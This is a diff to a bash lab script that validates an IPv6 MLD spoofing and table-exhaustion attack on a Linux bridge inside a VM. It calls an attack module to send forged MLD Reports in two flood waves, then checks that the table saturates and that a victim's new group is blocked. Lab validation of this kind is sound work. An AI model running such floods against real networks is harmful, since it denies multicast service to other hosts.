@@ -5,21 +5,28 @@
 #
 #   victim:   a host that joins one legitimate IPv6 group before the flood and a second one after it.
 #   attacker: a host that sends MLD Reports for groups it does not listen to, with MACabre's module. It
-#             first spoofs one membership (SPOOF_GROUP), then floods FLOOD_GROUPS groups from FLOOD_BASE.
+#             first spoofs one membership (SPOOF_GROUP), then floods two waves of groups from FLOOD_BASE.
 #
 # Phases:
 #   Phase 1 (control): the victim reports GROUP_BEFORE. The bridge must learn it on the victim's port.
 #            If it does not, the lab cannot tell anything and exits 2.
 #   Phase 2 (spoof): the attacker reports SPOOF_GROUP. The bridge must learn it on the attacker's port,
 #            which shows that one port can claim a group for itself.
-#   Phase 3 (flood): the attacker sends one report for each group in the range. The bridge's table fills up,
-#            and the attacker's port holds almost all of its entries.
-#   Phase 4 (test): the victim reports GROUP_AFTER, a legitimate group it has not joined before. With the
-#            table full, the bridge must not learn it on the victim's port.
+#   Phase 3 (flood, wave 1): the attacker reports FLOOD_GROUPS groups from FLOOD_BASE.
+#   Phase 4 (flood, wave 2): the attacker reports FLOOD_MORE more groups after those. Saturation means the
+#            entry count on the attacker's port stops growing: the bridge's table is full, and a larger
+#            flood adds nothing. The table is not guaranteed to hold exactly MCAST_HASH_MAX entries,
+#            because hash collisions leave some slots unused, so the check is a plateau, not a fixed number.
+#   Phase 5 (control after flood): the victim's GROUP_BEFORE must still be learned. If the flood evicted it,
+#            the test in phase 6 says nothing.
+#   Phase 6 (test): the victim reports GROUP_AFTER, a legitimate group it has not joined before. With the
+#            table saturated, the bridge must not learn it on the victim's port.
 #
-# Exit 0 when the control holds, the spoofed group is learned on the attacker's port, the attacker's port
-# holds at least MCAST_HASH_MAX - 2 entries, and the victim's new group is not learned. Exit 1 when the
-# spoof failed, the table was not full, or the new group was learned. Exit 2 when the control failed.
+# Exit 0 when the control holds, the spoofed group is learned on the attacker's port, the table saturates
+# (the entry count after wave 2 is within SATURATION_SLACK of the count after wave 1, and at least
+# MCAST_HASH_MAX - SATURATED_MARGIN), the victim's control survives the flood, and the victim's new group is
+# not learned. Exit 1 when the spoof failed, the table did not saturate, the control was evicted, or the new
+# group was learned. Exit 2 when the first control failed.
 #
 # Runs in a VM with IPv6 enabled (the sandbox has no IPv6 sysctls). The table size is set explicitly to the
 # kernel default (4096). Vendor switches have their own limits, so this shows the mechanism, not the size any
@@ -54,6 +61,9 @@ ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
 PY="${PYTHON:-$ROOT/.venv/bin/python}"
 MCAST_HASH_MAX="${MCAST_HASH_MAX:-4096}"
 FLOOD_GROUPS="${FLOOD_GROUPS:-4200}"
+FLOOD_MORE="${FLOOD_MORE:-1000}"
+SATURATION_SLACK="${SATURATION_SLACK:-2}"
+SATURATED_MARGIN="${SATURATED_MARGIN:-16}"
 FLOOD_BASE="ff0e::1000"
 SPOOF_GROUP="ff0e::4001"
 GROUP_BEFORE="ff0e::5001"
@@ -107,7 +117,10 @@ print(stats.reports)
 ' "$iface" "$mac" "$group" 2>/dev/null || echo 0
 }
 
-FLOOD_CODE='
+# Sends COUNT reports starting at BASE from the attacker's namespace. Prints the count sent.
+flood_wave() {
+    local base="$1" count="$2"
+    ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c '
 import sys, threading
 from macabre.attacks.mld_spoofing_flooding import MldSpoofingFloodingConfig, run_mld_spoofing_flooding
 stats = run_mld_spoofing_flooding(
@@ -115,7 +128,13 @@ stats = run_mld_spoofing_flooding(
     threading.Event(), lambda _s: None,
 )
 print(stats.reports)
-'
+' h-atk "$ATTACKER_MAC" "$base" "$count" 2>/dev/null || echo 0
+}
+
+# Prints the group address that is COUNT positions after BASE (IPv6, same /16).
+group_after_offset() {
+    "$PY" -c 'import ipaddress, sys; print(ipaddress.IPv6Address(sys.argv[1]) + int(sys.argv[2]))' "$1" "$2"
+}
 
 # Prints the number of bridge membership entries on a port (0 when none).
 entries_on_port() {
@@ -147,15 +166,29 @@ SPOOFED="$(learned p-atk "$SPOOF_GROUP")"
 echo "  $SPOOF_GROUP learned on the attacker's port: $SPOOFED"
 echo
 
-echo "Phase 3: attacker sends $FLOOD_GROUPS reports, one per group from $FLOOD_BASE"
-SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$FLOOD_CODE" h-atk "$ATTACKER_MAC" "$FLOOD_BASE" "$FLOOD_GROUPS" 2>/dev/null || echo 0)"
-echo "  reports sent: $SENT"
+echo "Phase 3: attacker floods wave 1, $FLOOD_GROUPS reports from $FLOOD_BASE"
+SENT1="$(flood_wave "$FLOOD_BASE" "$FLOOD_GROUPS")"
+echo "  reports sent: $SENT1"
 sleep 2
-ATTACKER_ENTRIES="$(entries_on_port p-atk)"
-echo "  entries on the attacker's port: $ATTACKER_ENTRIES (table size $MCAST_HASH_MAX)"
+ENTRIES_1="$(entries_on_port p-atk)"
+echo "  entries on the attacker's port: $ENTRIES_1 (table size $MCAST_HASH_MAX)"
 echo
 
-echo "Phase 4: victim reports $GROUP_AFTER after the flood"
+WAVE2_BASE="$(group_after_offset "$FLOOD_BASE" "$FLOOD_GROUPS")"
+echo "Phase 4: attacker floods wave 2, $FLOOD_MORE more reports from $WAVE2_BASE"
+SENT2="$(flood_wave "$WAVE2_BASE" "$FLOOD_MORE")"
+echo "  reports sent: $SENT2"
+sleep 2
+ENTRIES_2="$(entries_on_port p-atk)"
+echo "  entries on the attacker's port: $ENTRIES_2"
+echo
+
+echo "Phase 5: the victim's control group after the flood"
+CONTROL_AFTER="$(learned p-vic "$GROUP_BEFORE")"
+echo "  $GROUP_BEFORE still learned on the victim's port: $CONTROL_AFTER"
+echo
+
+echo "Phase 6: victim reports $GROUP_AFTER after the flood"
 send_one_report victim h-vic "$VICTIM_MAC" "$GROUP_AFTER" >/dev/null
 sleep 1
 AFTER="$(learned p-vic "$GROUP_AFTER")"
@@ -170,13 +203,22 @@ if [[ "$SPOOFED" != "yes" ]]; then
     echo "Result: the bridge did not learn the spoofed group $SPOOF_GROUP on the attacker's port. Not validated."
     exit 1
 fi
-if (( ATTACKER_ENTRIES >= MCAST_HASH_MAX - 2 )) && [[ "$AFTER" == "no" ]]; then
-    echo "Result: one port claimed $SPOOF_GROUP and filled the bridge's MLD table ($ATTACKER_ENTRIES of $MCAST_HASH_MAX entries). The victim's new group was not learned while the table was full. Vulnerable: MLD snooping can be exhausted and hijacked from one port."
-    exit 0
+GROWTH=$(( ENTRIES_2 - ENTRIES_1 ))
+SATURATED=no
+if (( GROWTH <= SATURATION_SLACK && ENTRIES_2 >= MCAST_HASH_MAX - SATURATED_MARGIN )); then
+    SATURATED=yes
 fi
-if [[ "$AFTER" == "yes" ]]; then
-    echo "Result: the victim's new group was learned after the flood, so the table was not exhausted on this bridge. Not validated."
+if [[ "$SATURATED" != "yes" ]]; then
+    echo "Result: the table did not saturate (wave 1: $ENTRIES_1 entries, wave 2: $ENTRIES_2, table size $MCAST_HASH_MAX). Not validated."
     exit 1
 fi
-echo "Result: the table held $ATTACKER_ENTRIES entries, below the threshold for exhaustion. Not validated."
-exit 1
+if [[ "$CONTROL_AFTER" != "yes" ]]; then
+    echo "Result: the flood evicted $GROUP_BEFORE from the victim's port, so the new-group test is inconclusive. Not validated."
+    exit 1
+fi
+if [[ "$AFTER" == "yes" ]]; then
+    echo "Result: the victim's new group was learned after the flood, so the saturated table did not block it. Not validated."
+    exit 1
+fi
+echo "Result: one port claimed $SPOOF_GROUP and saturated the bridge's MLD table ($ENTRIES_2 entries, flat from $ENTRIES_1 to $ENTRIES_2 across two waves). The victim's existing group survived and its new group was not learned. Vulnerable: MLD snooping can be exhausted from one port."
+exit 0
